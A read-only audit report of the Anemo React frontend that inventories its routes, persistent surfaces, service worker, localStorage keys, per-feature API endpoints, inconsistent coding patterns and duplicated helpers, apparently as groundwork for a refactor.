# Anemo frontend audit (read-only), 2026-11-08

Scope: `frontend` (React 19.2, TS 6.0.3, Vite 8, React Router 8, TanStack Query 5, Zustand 5, Tailwind 4, Radix, openapi-fetch 0.17).
Size: 358 source files under `src/`, about 28.6k lines without the generated `src/api/schema.d.ts` (14,264 lines).
Paths below are relative to `frontend/src/` unless they start with `public/` or `../`.

Baseline checks (nothing was modified):
- `vitest run`: 43 files, 197 tests, all pass.
- `tsc -p tsconfig.app.json --noEmit`: clean. TS 6 turns `strict` on by default; the tsconfig does not set it explicitly.
- `oxlint src`: clean. Only `react/rules-of-hooks` and `only-export-components` are configured (`.oxlintrc.json`).
- `madge --circular`: 2 cycles (see §6).
- `knip`: no unused files, 32 "unused exports" and 38 "unused exported types". These were checked by hand in §7.

---

## 1. View / route inventory

### Routes (`app/router.tsx`)
Every route except `/` and `/c/:id` is lazy-loaded through `page()` (router.tsx:19). `router.navigate` is monkey-patched at router.tsx:107-116 to add `viewTransition`. It skips the transition for same-page navigations, when a `[role=dialog]` is open, and when reduced motion is set.

| Path | Component (file:line) | Notes |
|---|---|---|
| `/login` | `features/auth/LoginPage.tsx:9` (`LoginPage`) | eager; `?next=` checked by `startsWith('/') && !startsWith('//')` (LoginPage.tsx:19) |
| `/s/:token` | `features/shares/SharedPage.tsx` (`SharedPage`) | public, no auth, own errorElement |
| layout `RequireAuth` | `features/auth/RequireAuth.tsx:8` | errorElement `app/RouteError.tsx:10` |
| `/browser/:conversationId` | `features/browser/BrowserPage.tsx:13` | inside auth, **outside AppLayout** (no sidebar, island, toasts or SSE) |
| layout `AppLayout` | `app/AppLayout.tsx:44` | |
| `/` (index) | `app/StartPage.tsx:39` | NewChatPage, or a one-time redirect to `/setup` / `/home` |
| `/home` | `features/home/HomePage.tsx:37` | |
| `/setup` | `features/setup/SetupPage.tsx:254` | |
| `/c/:conversationId` | `features/chat/pages/ConversationPage.tsx:82` | eager; `handle.ownMobileHeader` |
| `/chats` | `features/chat/pages/ChatsPage.tsx:75` | |
| `/projects` | `features/projects/ProjectsPage.tsx` | |
| `/search` | `features/search/SearchPage.tsx` | |
| `/files` | `features/files/FilesPage.tsx:240` | `?path=&file=` |
| `/documents`, `/documents/:documentId`, `/documents/*` | `features/documents/DocumentsPage.tsx` (3 routes, same component) | `*` = a document addressed by its path |
| `/tasks` | `features/tasks/TasksPage.tsx:40` | `?task=&view=&tag=` |
| `/calendar` | `features/calendar/CalendarPage.tsx:59` | |
| `/focus` | `features/focus/FocusPage.tsx` | |
| `/music` | `features/music/MusicPage.tsx` | |
| `/stats` | `features/stats/StatsPage.tsx` | **not in the sidebar**; reachable only from the palette and the Home "This week" widget |
| `/runs`, `/runs/:runId` | `features/runs/pages/RunsPage.tsx`, `RunDetailPage.tsx` | |
| `/automations` | `features/automations/AutomationsPage.tsx` | |
| `/agents` | `features/profiles/pages/ProfilesPage.tsx` | the route is named "agents", the feature folder is `profiles` |
| `/memory` | `features/memory/MemoryPage.tsx` | |
| `/notifications` | `features/notifications/NotificationsPage.tsx` | |
| `/settings` (layout) | `features/settings/pages/SettingsLayout.tsx` (`SettingsLayout`, index `SettingsIndex`) | eager |
| `/settings/general` | `settings/pages/GeneralPage.tsx` | |
| `/settings/appearance` | `settings/pages/AppearancePage.tsx` | |
| `/settings/focus` | `focus/FocusSettingsPage.tsx` | also saves the `music` section |
| `/settings/skills` | `skills/SkillsSettingsPage.tsx` | |
| `/settings/providers` | `providers/ProvidersPage.tsx` | |
| `/settings/permissions` | `agents/PermissionsPage.tsx` | |
| `/settings/workspace` | `files/WorkspaceSettingsPage.tsx` | |
| `/settings/web` | `web/WebSettingsPage.tsx` | |
| `/settings/mcp` | `mcp/McpSettingsPage.tsx` | |
| `/settings/notifications` | `notifications/NotificationSettingsPage.tsx` | |
| `/settings/memory` | `memory/MemorySettingsPage.tsx` | |
| `/settings/sharing` | `shares/SharedLinksPage.tsx` | |
| `/settings/usage` | `usage/UsagePage.tsx` | |
| `/settings/advanced` | `settings/pages/AdvancedPage.tsx` | holds the update notice |

The Settings section list is duplicated in `features/settings/sections.ts`, which feeds both SettingsLayout and the palette (`search/pages.ts:52`).

### Always-mounted surfaces (AppLayout.tsx:66-88)
- **Sidebar** (`app/Sidebar.tsx:204`), the folded **SidebarRail** (`:166`), and the phone **SidebarDrawer** (AppLayout.tsx:26, Radix dialog). The sidebar holds: New chat, Search, ProjectSwitcher (`:129`, a Select with "All projects" / projects / `__manage__`), ConversationList, then page tiles (Home, Projects, Files, Documents, Tasks, Calendar, Focus, Music, Runs (RunsBadge), Automations, Agents, Memory (MemoryBadge)), Notifications (badge), Settings, and Sign out. The page list exists **three times**: Sidebar.tsx:277-288, SidebarRail :182-198 and search/pages.ts:34-51. Labels differ ("Agents" vs "Profiles & Skills"), and Stats is only in the palette.
- **MobileTopBar** (`app/mobileNav.tsx:33`), MenuButton, NewChatButton.
- **Island** (`features/island/Island.tsx:41`). Modes: hidden, compact (timer ring and/or music), expanded (controls; Esc or click-outside closes), alert. Alerts come from `island/alerts.ts`: a FIFO queue where an alert with a `key` replaces one with the same key. It publishes the CSS var `--island-w` and `data-island` on `#main-column`. `useIslandVisible` drives the phone top bar.
- **PersistentLayer** (`app/PersistentLayer.tsx`): `TimerEngine` (focus/TimerEngine.tsx) and `PlayerEngine` (music/PlayerEngine.tsx).
- **Dialog hosts**: `ReauthDialog`, `DialogHost` (confirm/prompt/choose queue, components/ui/dialogs.ts), `MoveChatsDialog`, `ShareDialog`, `ToastHost`, `CommandPalette`, `ShortcutSheet`.
- **App-wide hooks** in AppLayout: `useAppearanceSync`, `useAppEvents` (SSE), `useServiceWorkerLinks`, `useSidebarSwipe`.

### Command palette (`features/search/CommandPalette.tsx`, Ctrl/⌘+K)
- Pages: the `PAGES` list (17 pages, plus Settings sections that appear only once something is typed).
- Actions (`search/actions.ts:33-58`), 7 in total: Start focus, Pause/resume timer, Play/pause music, Next track, Paste a music link… (prompt, then playlist choice, then `player.add`, which **appends**), Edit home layout (`/home?edit=1`), Keyboard shortcuts (only when there is a keyboard).
- Search results: `GET /api/search`, in 7 kinds (`search/kinds.ts`: chat, document, memory, task, event, file, automation).

### Home widgets (`features/home/layout.ts:12`)
`WIDGET_IDS = focus, today, daily, music, needs, week, tasks, ask, documents, upcoming, briefing`.
`DEFAULT_LAYOUT` (layout.ts:43) has `briefing` hidden. `ADDED_AFTER = { daily: 'today' }`.
Widgets live in `home/widgets/*Widget.tsx`. `HomePage.render` is a switch (HomePage.tsx:54-68). The layout is stored in the server settings section `home` (`layout` / `mobile_layout`) through `useHomeLayout.ts` (a raw `PUT /api/settings/home`, debounced 500 ms).

### Keyboard shortcut registry (`features/shortcuts/registry.ts:55-88`), all 29 ids
| id | keys | wired at |
|---|---|---|
| app.search | Mod+K | CommandPalette (useShortcut) |
| app.sidebar | Mod+\ | AppLayout.tsx:52 |
| app.shortcuts | ? | AppLayout.tsx:58 |
| app.close | Esc | documentation only (Radix and Island.tsx:80 handle Esc) |
| search.move | ↑/↓ | CommandPalette.tsx:132 |
| search.open | Enter | CommandPalette.tsx:137 |
| chat.send | Enter (no Shift), Mod+Enter (quiet) | Composer.tsx:154 |
| chat.newline | Shift+Enter | documentation only (native textarea) |
| chat.skill | / | documentation only (Composer slash menu) |
| chat.quickDelete | hold Shift | hooks/useShiftHeld.ts |
| home.edit | E | HomePage |
| home.stopEditing | Esc | HomePage |
| home.move | arrows | WidgetGrid.tsx:89 |
| home.resize | Shift+arrows | WidgetGrid.tsx:82 |
| home.hide | Delete / Backspace (quiet) | WidgetGrid.tsx:96 |
| focus.toggle | Space | FocusPage |
| focus.reset | R | FocusPage |
| focus.skip | S | FocusPage |
| focus.addMinute | + / = | FocusPage |
| music.toggle | Space | MusicPage |
| files.save | Mod+S | files (CodeEditor/FilePreview) |
| files.paste | Mod+V | FilesPage PasteBar |
| files.cancelPaste | Esc | FilesPage PasteBar |
| diagram.zoomIn | + / = | DiagramViewer.tsx:54 |
| diagram.zoomOut | - | DiagramViewer.tsx:55 |
| diagram.fit | 0 | DiagramViewer.tsx:56 |

`shortcuts/guard.test.ts:8-13` hard-codes the file paths that may add global keydown listeners: `hooks/useShortcut.ts`, `hooks/useShiftHeld.ts`, `features/island/Island.tsx`, `features/chat/tab.ts`. **Moving or renaming these files in the refactor breaks that test.** The `AREAS[].pages` predicates (registry.ts:42-51) also hard-code route paths.

### Service worker / PWA / push
- Registration: `main.tsx:22`, production only, `navigator.serviceWorker.register('/sw.js')` on load.
- `public/sw.js`: `VERSION='v3'`, cache `anemo-shell-v3`, precache `/offline.html`, `/favicon.svg?v=2`, `/icons/icon-192.png?v=2`.
  - Never touches `/api/*`.
  - Navigations go to the network with `/offline.html` as the fallback.
  - `/assets/*` and `/icons/*` are cache-first.
  - Push: shows a notification. Action buttons carry one-time tokens, which `POST /api/public/push/actions` with `credentials:'omit'` (sw.js:111).
  - `notificationclick` focuses an existing client and `postMessage({type:'anemo.navigate', path})`, otherwise calls `openWindow`.
  - `safeLink()` (sw.js:71) allows only `/...`.
- `public/manifest.webmanifest`: standalone, `start_url /`, icons `?v=2`. `index.html` holds the inline pre-paint theme script, which reads `localStorage['aiw.appearance']`.
- Client side: `notifications/push.ts` covers pushSupport (insecure / ios-install / unsupported / dev / blocked), subscribing (`GET /api/push/key`, `PushManager.subscribe`, register through `POST /api/notification-destinations` with withReauth in the caller), and the flag `localStorage['anemo.pushOn']`. `notifications/useServiceWorkerLinks.ts` receives SW messages and navigates when `isAppPath` holds. `notifications/desktop.ts` handles in-tab `Notification`s when the tab is hidden, only if `localStorage['anemo.desktopNotifications']==='on'` and push is not on here.
- The backend sends `Cache-Control: no-cache` for sw.js and the manifest (`../backend/app/main_api.py:90`).

### Focus timer offline behaviour (`focus/timer.ts`, `timerStore.ts`, `outbox.ts`, `TimerEngine.tsx`)
- The state lives in `localStorage['anemo-timer']` (zustand persist v1, `partialize` = timer + prefs). It is wall-clock based: remaining time is computed from `startedAt`/`accumulated`, not from ticks. The timer survives reloads and a phone sleeping, and a phase that ended while the app was closed is completed at its real end time.
- Finished or cut-short sessions go to `localStorage['anemo-focus-outbox']`. They are sent immediately, then retried on `online`, every 60 s while something waits, and on app open. 4xx responses other than 401, 408 and 429 drop the session. The server de-duplicates by `client_id`.
- `POST /api/focus/phase-ended` (the notification copy) is fire-and-forget and is **not** queued, so it is lost while offline.
- Cross-tab: a `storage` event triggers `persist.rehydrate()` (TimerEngine.tsx:81-88).
- `useTodayFocus` (focus/api.ts:32) adds sessions still waiting in the outbox when no project filter is set.

### Music player and queue semantics (`music/player/controller.ts`)
- Persisted state `localStorage['anemo-player']` (v1): queue, index, volume, lastVolume, shuffle, repeat (default **'all'**), and position (written only when it has moved ≥5 s, controller.ts:295).
- Runtime state (`usePlayerRuntime`) is not persisted. Adapters: YouTube (iframe API), SoundCloud (widget API), `<audio>`. All run in one hidden host (`host.ts`).
- **Adding = APPEND** (controller.ts:461 `add`, :477 `append`), used by:
  - the paste box on the Music page and in the Home widget (`player.add`);
  - the palette "Paste a music link" action (`search/actions.ts:47`);
  - a playlist's "Add to queue" (`PlaylistsPanel.tsx:27` `enqueue`);
  - an agent `music.control` without `replace` (`chat/agentControl.ts:39`).

  An added track already in the queue gets a copy with a new id, so duplicates are allowed. Append **auto-plays the first added track when idle**: `wasIdle = !runtime.loaded || queue empty` (controller.ts:480). That includes the case after a reload where a saved queue exists but nothing has played yet this session.
- **Replace**: `playTracks` (controller.ts:499), used by playlist Play / Shuffle (`PlaylistsPanel.tsx:26`) and by agent `music.control` with `replace:true` (`agentControl.ts:38`).
- `playNext` inserts right after the current track (:510) and does not start playback.
- `remove` and `clear` come with an Undo toast.
- `nextIndex` with shuffle is a uniform random pick that only avoids the current track (:329). There is no shuffle order, and with repeat 'off' a shuffled queue never ends.
- Media Session handlers: :377. Cross-tab rehydrate: PlayerEngine.tsx:152.
- Ambient sounds: `localStorage['anemo-ambient']`, `{kind, volume}` (music/player/ambient.ts:26).

### Notifications UI
- NotificationsPage: list, read-all, delete.
- NotificationSettingsPage: destinations CRUD and test, push on/off, desktop on/off. DestinationDialog.
- Sidebar unread badge.
- The SSE `notification` event shows a desktop notification, or a toast with "Open" (useAppEvents.ts:91-101). Focus-kind notifications are skipped.
- Island alerts for agent finished / failed / approval needed (`chat/agentAlerts.ts`).

### Setup / first run
- `app/StartPage.tsx`: on the first load per tab (`sessionStorage['anemo.opened']`), redirect to `/setup` if `GET /api/setup/status` says `offer_setup`, otherwise to `/home` if `settings.general.start_page==='home'`, otherwise show the new chat.
- `setup/SetupPage.tsx` steps (from `setup/steps.ts`): provider, models, you, parts, notifications. Progress is saved through `useSaveSection('setup')` as `{status, step}`.

### Update notice
- `features/updates/UpdatesCards.tsx`: `UpdatesCard` and `WhatsNewCard`, rendered only on `/settings/advanced` (AdvancedPage.tsx:13,82).
- It also feeds the Home "Needs you" widget through `home/useNeedsYou.ts:28`.
- There is no global banner.
- Endpoints: `GET /api/updates`, `POST /api/updates/check`, `POST /api/updates/dismiss`, `POST /api/updates/whats-new/dismiss`, and the `updates` settings section.

### Share pages
- `/s/:token`: `shares/SharedPage.tsx`, read-only chat / document / project, using `GET /api/public/shares/{token}`. Inside a project it uses `?doc=N&task=N`.
- The server sends `Referrer-Policy: no-referrer` and `X-Robots-Tag` for `/s/*` (`../backend/app/main_api.py:102`).
- Management: ShareDialog (global, `useShareDialog` store) and `/settings/sharing`.

---

## 2. Per-feature summary

Storage keys, all of them (renaming any is a behaviour change):

| Key | Store | Where |
|---|---|---|
| `aiw.appearance` | localStorage | settings/theme.ts:38 **and** index.html:25 (legacy "aiw" prefix; must stay in sync) |
| `anemo-sidebar` | localStorage | app/sidebarStore.ts:19 (zustand persist) |
| `anemo-project` | localStorage | app/projectStore.ts:22 |
| `anemo-timer` | localStorage | focus/timerStore.ts:41 (v1, partialized) + TimerEngine.tsx:83 storage listener |
| `anemo-focus-outbox` | localStorage | focus/outbox.ts:17 + TimerEngine.tsx:84 |
| `anemo-player` | localStorage | music/player/controller.ts:57 (v1) + PlayerEngine.tsx:154 |
| `anemo-ambient` | localStorage | music/player/ambient.ts:28 + PlayerEngine.tsx:155 |
| `anemo.pushOn` | localStorage | notifications/push.ts:17 |
| `anemo.desktopNotifications` | localStorage | notifications/desktop.ts:9 |
| `anemo.opened` | sessionStorage | app/StartPage.tsx:7 |
| `anemo.tab` | sessionStorage | chat/tab.ts:14 |
| Cache Storage `anemo-shell-v3` | SW cache | public/sw.js:20 |

No IndexedDB is used. Naming is mixed: dashes for zustand persist keys, dots for hand-written keys, and the legacy `aiw.` prefix.

Non-persisted zustand stores (21 stores in total): `useToasts`, `useDialogQueue`, `useMobileNav`, `useClock`, `useShortcutSheet`, `useShellOutput`, `useReauthStore`, `usePalette`, `useClipboard` (files), `useMoveChats` (chat/chatActions.tsx:24), `useThemeStore`, `usePlayerRuntime`, `useIslandVisible`, `useIslandAlerts`, `useShareDialog`.
React contexts: only 3, all local (`ClosingContext`, Markdown `SourceContext`, `DiagramFixContext`).

Endpoints are listed as METHOD path. Every call goes through `@/api/client` openapi-fetch plus `unwrap` unless marked RAW.

- **agents** (16 files, 1,446 lines). Agent run UI: RunActivity (timeline, tool rows, approvals, file changes, plan), ModeSwitch, PlanEditor, QuestionCard, ShellCall, SshKeyCard, PermissionsPage. Endpoints: GET /api/approvals; POST /api/approvals/{id}; GET /api/permissions/catalog; POST /api/permissions/preview; GET /api/permissions/summary; PUT /api/settings/permissions; GET /api/runs/{id}/timeline; POST /api/runs/{id}/files/{change_id}/revert; GET /api/shell/ssh-key (in a component, SshKeyCard.tsx); links to /api/attachments/{id}/content and /api/runs/{id}/outputs/{call} (runs/api.ts:108). Store: `useShellOutput` (never cleared).
- **auth** (5 files). LoginPage, RequireAuth, ReauthDialog, `withReauth`. Endpoints: POST /api/auth/login, POST /api/auth/logout, GET /api/auth/me, POST /api/auth/reauth, GET /api/auth/sessions, DELETE /api/auth/sessions/{id}. Logout does `qc.clear()` and then a hard `location.replace('/login')`.
- **automations** (6 files). Automation list and dialog, schedule form, templates. Endpoints: GET/POST /api/automations, PATCH/DELETE /api/automations/{id}, POST /api/automations/{id}/run, POST /api/automations/schedule-preview, GET /api/runs (filtered by automation).
- **browser** (6 files). The agent's live browser panel and page: an SSE frame stream plus an input queue. Endpoints: GET /api/browser/status, GET/DELETE /api/conversations/{id}/browser, POST /api/conversations/{id}/browser/input, SSE GET /api/conversations/{id}/browser/stream?width= (useBrowserStream.ts:36).
- **calendar** (6 files). FullCalendar page, EventDialog, DayList, recurrence presets. Endpoints: GET/POST /api/calendar/events, GET/PUT/DELETE /api/calendar/events/{id}, PUT /api/calendar/events/{id}/occurrences/{original_start}. Reads tasks through tasks/api.
- **chat** (23 files, 2,842 lines). Conversation list and page, Composer, MessageBubble, ModelPicker, Move dialog, temporary chats, attachments, run SSE, app SSE, agent controls (`focus.control` / `music.control`), presence. Endpoints: GET/POST /api/conversations, POST /api/conversations/bulk, GET /api/conversations/tags, GET/PATCH/DELETE /api/conversations/{id}, POST .../branch, .../edit-last, .../regenerate, .../save-document, .../turns, GET .../messages, POST .../messages/{mid}/version, POST /api/runs/{id}/cancel, POST /api/presence. RAW `POST /api/attachments` (useAttachments.ts:22). SSE /api/events?tab= and /api/runs/{id}/events. Download link /api/conversations/{id}/export.
- **documents** (13 files). Documents library, Tiptap RichEditor plus CodeMirror source mode, autosave with base-hash conflicts, revisions, link picker, passages (#text=). Endpoints: GET/POST /api/documents, GET /api/documents/by-path (also called raw-ish in DocumentsPage and FilesPage), GET/PUT/DELETE /api/documents/{id}, POST .../move, GET .../revisions, GET .../revisions/{rid}, POST .../revisions/{rid}/restore. RAW `POST /api/documents/assets` (documents/api.ts:118).
- **files** (7 files). File manager (FilesPage), preview and CodeEditor, trash, workspace settings, an in-tab cut/copy clipboard store. Endpoints: GET /api/files, GET/PUT /api/files/content, POST /api/files/copy|folder|move, GET /api/files/search, GET/POST /api/files/trash, DELETE /api/files/trash/{id}, POST /api/files/trash/{id}/restore, PUT /api/settings/workspace, PUT /api/settings/files (section). RAW `POST /api/files/upload` (files/api.ts:123). Link /api/files/download?path=.
- **focus** (13 files). Pomodoro timer; see §1. Endpoints: GET/POST /api/focus/sessions, POST /api/focus/phase-ended, PUT /api/settings/focus and /api/settings/music (sections). Static sounds /sounds/*.mp3.
- **home** (22 files, 1,745 lines). Widget grid; see §1. Endpoints: GET/PUT /api/daily-notes/{day}, GET /api/documents/recent, GET /api/runs/{id} (briefing answer), POST /api/conversations/{id}/turns (AskWidget, a duplicate of NewChatPage), raw PUT /api/settings/home (useHomeLayout.ts:33). Reads many other features' hooks.
- **island** (4 files). See §1. No endpoints.
- **links** (7 files). Backlinks, task attachments, a file finder. Endpoints: GET /api/documents/{id}/backlinks, GET /api/tasks/{id}/backlinks, GET /api/files/links, GET /api/files/upload-folder, GET/POST/DELETE /api/tasks/{id}/files. RAW `POST /api/tasks/{id}/files/upload` (links/api.ts:40).
- **mcp** (5 files). MCP servers settings. Endpoints: GET/POST /api/mcp/servers, PATCH/DELETE /api/mcp/servers/{id}, POST .../refresh, GET .../tools, PATCH /api/mcp/tools/{id}.
- **memory** (5 files). Memory list and review, settings, an in-chat notice with Undo. Endpoints: GET/POST /api/memories, POST /api/memories/reindex, POST /api/memories/suggestions, GET /api/memories/summary, PATCH/DELETE /api/memories/{id}, POST .../approve, PUT /api/settings/memory. Link /api/memories/export.
- **music** (21 files, 2,664 lines). See §1. Endpoints: GET/POST /api/music/playlists, PATCH/DELETE /api/music/playlists/{id}, POST/PUT .../tracks, POST /api/music/tracks. RAW cross-origin fetch to the YouTube and SoundCloud oEmbed endpoints (detect.ts:76). Third-party scripts are injected (§10).
- **notifications** (7 files). See §1. Endpoints: GET/POST /api/notification-destinations, PATCH/DELETE .../{id}, POST .../{id}/test, GET/DELETE /api/notifications, POST /api/notifications/read, GET /api/notifications/summary, DELETE /api/notifications/{id}, GET /api/push/key, POST /api/push/subscriptions.
- **profiles** (8 files). Agent profiles and skills (lists, dialogs, permissions). Endpoints: GET/POST /api/profiles, PUT/DELETE /api/profiles/{id}, GET/POST /api/skills, POST /api/skills/import, PUT/DELETE /api/skills/{id}, POST /api/skills/{id}/reset. Link /api/skills/{id}/export.
- **projects** (1 file, 195 lines). Projects CRUD page. It **has no api.ts of its own**: projects live in `tasks/api.ts` (GET/POST /api/projects, PUT/DELETE /api/projects/{id}).
- **providers** (9 files). Providers, models, model defaults, discovery, Claude Code status. Endpoints: GET/POST /api/models, PATCH/DELETE /api/models/{id}, POST /api/models/{id}/test, GET /api/provider-types, GET/POST /api/providers, PATCH/DELETE /api/providers/{id}, GET .../discover, POST .../models/import, POST .../test, GET /api/providers/claude-code/status, PUT /api/settings/models, GET /api/setup/status.
- **runs** (4 files). Run list and detail, pause/resume/plan. Endpoints: GET /api/runs, GET /api/runs-summary, GET /api/runs/{id}, POST .../pause, POST .../resume, PUT .../plan.
- **search** (8 files). Palette and SearchPage. GET /api/search.
- **settings** (10 files). General, Appearance and Advanced pages, layout, theme, system status, audit. Endpoints: GET /api/settings, PUT /api/settings/general|appearance, PUT /api/settings/{section} (generic, settings/api.ts:43), GET /api/system/status, GET /api/audit (inline in AdvancedPage).
- **setup** (2 files). First run. Uses providers and notifications components; PUT /api/settings/setup.
- **shares** (7 files). Share dialog, links page, public page. Endpoints: GET/POST/DELETE /api/shares, DELETE /api/shares/{id}, POST /api/shares/{id}/refresh, GET /api/public/shares/{token}.
- **shortcuts** (4 files). Registry, sheet, keys. No endpoints.
- **skills** (4 files). Settings page that reuses profiles components; slash commands; icon map.
- **stats** (6 files). GET /api/stats; BarChart, Heatmap.
- **tasks** (10 files, 1,440 lines). List, board, dialog, structure (subtasks and checklist), repeat rules, relations. Endpoints: GET/POST /api/tasks, POST /api/tasks/reorder, PATCH/DELETE /api/tasks/{id}, plus projects (above).
- **updates** (2 files). See §1.
- **usage** (4 files). GET /api/usage/records, GET /api/usage/summary.
- **web** (1 file, 152 lines). The page contains its own `useQuery`/`useMutation`: GET /api/web/status, POST /api/web/test-search, PUT /api/settings/web.

---

## 3. Patterns and inconsistencies

**API calls.** There are 190 typed `api.X()` calls through openapi-fetch plus `unwrap`, against `client.ts:13`. Exceptions:
- 4 RAW `fetch` multipart uploads, each with its own copy of the error parsing:
  - files/api.ts:123, which also does `body as unknown as Entry[]`;
  - documents/api.ts:118;
  - links/api.ts:40;
  - chat/useAttachments.ts:22.

  They bypass `unwrap`, so **a 401 does not fire `onUnauthorized`**.
- 1 RAW cross-origin oEmbed fetch (music/player/detect.ts:76).
- A generic `api.PUT as unknown as (path: string…)` cast (settings/api.ts:43). Its comment claims the path "is checked by the generated types per call site", which is false.
- About 25 typed calls sit outside `*/api.ts`, inside components and pages:
  - FilesPage.tsx:306 and :314 (raw `api.GET`, no `unwrap`, errors ignored);
  - DocumentsPage.tsx;
  - NewChatPage.tsx:42 and AskWidget.tsx:34 (duplicated create-and-send);
  - useHomeLayout.ts:33;
  - WebSettingsPage.tsx (3);
  - SshKeyCard.tsx, AdvancedPage.tsx, systemStatus.ts, useDailyNote.ts (2), FilesTab.tsx, ReauthDialog.tsx;
  - music/api.ts:72 (Undo recreate without `unwrap`).
- `useQuery`/`useMutation` defined outside api.ts: SshKeyCard, WebSettingsPage, WorkspaceSettingsPage, settings/systemStatus.ts, AdvancedPage, home/useDailyNote.ts, DocumentsPage.

**Query keys.** 37 exported constants (`xxxKey`, listed by `grep "Key = "`), but inline arrays are mixed in:
- `['runs-summary']` (useAppEvents.ts:33) duplicates `runsSummaryKey`.
- `['conversation', id]` (runs/api.ts) duplicates `conversationKey`.
- `['memories']` (ConversationPage.tsx:146, useAppEvents.ts:66) duplicates `memoriesKey`.
- `['documents']`, `['document', id]`, `['projects']`, `['tasks']`, `['focus']`, `['stats']`, `['music']`, `['calendar']`, `['files']` are inline in useAppEvents.ts and others.
- `['permissions','summary']` (mcp/api.ts, profiles/api.ts) duplicates `permissionSummaryKey`.

Shapes differ: some keys are singular (`['run', id]`, `['document', id]`, `['conversation', id]`), others plural (`['runs', …]`). `providersKey`, `modelsKey`, `setupKey` and `filesKey` are not exported. `['setup-status']`, `['claude-code-status']` and `['provider-types']` use dash names. The dailyNote key nests under `['documents', 'daily', …]` (home/useDailyNote.ts:22). Default `staleTime` is 30 s, `retry` 1, no refetch on focus (main.tsx:11).
**Invalidation**: `run.status` SSE invalidates `['runs']` but not `['run', id]` (the detail page relies on polling).

**Errors and toasts.** `errorMessage()` is used 99 times in 72 files, almost always rendered inline as `<p className="text-error">` (132 `text-error` occurrences). There are only 17 `toast()` calls in 13 files. Mutation `onError` appears only 12 times. 62 `.isError` renders. 36 swallowing `.catch(() => undefined)` / `catch {}` sites. `withReauth` is used 26 times. There is no global mutation error handler and no QueryCache `onError`.

**SSE.** There are 3 independent `new EventSource` sites:
- chat/useAppEvents.ts:24, app-wide, with 19 listeners;
- chat/runStream.ts:130, per run, with 18 event types;
- browser/useBrowserStream.ts:36.

None of them guards `JSON.parse`, and there is no shared helper. Each `addEventListener` has a cast `as EventListener` (about 18). An open conversation holds 2–3 SSE connections per tab, which could hit the HTTP/1.1 limit of 6 connections per host across tabs if the server is not behind HTTP/2.

**State.** Server state uses TanStack Query (68 `useQuery`, 100 `useMutation`). Cross-page client state uses 21 zustand stores. Imperative singletons live outside React: the `player` object, `timerActions`, `islandAlert`, `toast`, `confirmDialog`, and `router` imported directly in `focus/focusOnTask.ts:2`. Context is barely used, and prop-drilling is modest. Module-level mutable state appears in StartPage.tsx:30, controller.ts:72-116, alerts.ts:41, tab.ts and useNow.ts. Two features (`focus` in `timerStore`, and `music`) keep logic in plain modules, which is good for a refactor but makes their hidden globals important to preserve.

**Styling.** Tailwind with semantic tokens (`bg-surface`, `text-muted`, `accent-soft`, `rounded-control`) defined in `styles/tokens.css` (140 lines) is used consistently. Exceptions:
- 736 arbitrary `text-[Npx]` sizes (`13px` ×275, `12px` ×137, `12.5px` ×125, `11px` ×44, …). There is no type scale.
- 37 `style={{}}` in 22 files, mostly project colour dots and dynamic sizes.
- Hard-coded hex values: the project palette `ProjectsPage.tsx:26`, the default `'#6b7280'` repeated in tasks/api.ts:115 and TaskDialog.tsx:85, accent presets in theme.ts:27, diagram fallbacks in diagrams/colors.ts (15).
- About 18 non-semantic `text-white`, `bg-black/NN` and similar classes (badges in Sidebar.tsx:95, :110 use `text-white` on `bg-warning`).
- `app.css` (437 lines) holds animation and utility classes: `.page`, `.drawer`, `.sheet`, `.fade`, `.pop`, `.toast`, `.msg-in`, `.shimmer`, `.flash`, `.wave`, `.eq-bar`, `.markdown`, `.tiptap`, `.fc`/`.fc-phone`, `.hljs-*`, `.theme-transition`, `.island-clear-left`, `.island-reserve`, `.table-scroll`.

**Forms.** No form library. 10 `<form>` elements, otherwise controlled `useState` per field plus `onClick` saves. Dialog forms (ProviderDialog, ProfileDialog, SkillDialog, AutomationDialog, EventDialog, TaskDialog, ServerDialog, DestinationDialog) each re-implement load→state→validate→save.

**Folder convention.** `api.ts` exists in 25 of 31 features; island, projects, setup, shortcuts, skills and web have none. `pages/` exists only in chat, profiles, runs and settings; the others put `*Page.tsx` at the feature root. `components/` exists in 15. Settings pages are spread across feature folders (focus, files, mcp, memory, notifications, skills, web, providers, agents, shares, usage), which is fine but inconsistent with `settings/pages/`.

---

## 4. Duplicated logic and components

- **File size formatter ×3** with different output:
  - `lib/format.ts:77` (KB rounded);
  - `features/links/files.ts:4` (same, null-safe);
  - `features/files/FilesPage.tsx:56` (KB with `toFixed(1)`).

  Merging them changes FilesPage output.
- **Duration formatter ×2**: `lib/format.ts:4` (seconds) and `agents/components/ShellCall.tsx:23` (ms). Related: `focus/api.ts:51 formatMinutes`, `music/format.ts formatSeconds`, `focus/timer.ts:235 formatClock`, `chat/remaining.ts:18`.
- **Local-day helpers**: `pad` ×4 (tasks/dates.ts:7, usage/ranges.ts:45, chat/pastedFiles.ts:12, automations/scheduleForm.ts:39). `dayOf` ×2 (tasks/dates.ts:10, automations/scheduleForm.ts:40); `dayKey` in usage/ranges.ts:46. `startOfToday` lives in focus/api.ts:24 and is imported by home/dates.ts. Two `dayLabel` functions with different meanings: lib/format.ts:30 and usage/ranges.ts:62. Two `rangeFor`: stats/ranges.ts:8 and usage/ranges.ts:22. `formatWhen` and `formatUpcoming` (lib/format.ts) each recompute `startOfToday`.
- **Repeat presets ×2**: `tasks/repeat.ts:6` and `calendar/recurrence.ts:17`. They hold the same RRULE strings with different value ids and labels ("Doesn’t repeat" vs "Does not repeat", "Every weekday" vs "Every weekday (Mon–Fri)").
- **Navigation page list ×3**: Sidebar.tsx:277-288, SidebarRail (Sidebar.tsx:182-198) and search/pages.ts:34-51. Sidebar also has 4 near-identical NavLink wrappers (`PageLink`, `PageTile`, `HeaderLink`, `RailLink`, Sidebar.tsx:43-163) and 3 near-identical count badges (RunsBadge, MemoryBadge, NotificationsBadge, :89-126).
- **Create conversation + first turn + seed cache**: `chat/pages/NewChatPage.tsx:37-58` and `home/widgets/AskWidget.tsx:25-45`. Both bypass `useSendTurn`/`useApplyTurn` in chat/api.ts:87.
- **Multipart upload + error parsing ×4** (see §3).
- **"by-path" document lookup**: DocumentsPage.tsx (`['document-by-path']` query) and FilesPage.tsx:314 (raw effect).
- **Settings save paths**: `useSaveSection` (settings/api.ts:38), `useSaveGeneral`, `saveAppearance` (no cache update), raw PUT in useHomeLayout.ts:33, and per-feature PUTs for models, permissions, workspace, web and memory.
- **Storage `rehydrate` on `storage` events** ×2: TimerEngine.tsx:81 and PlayerEngine.tsx:152.
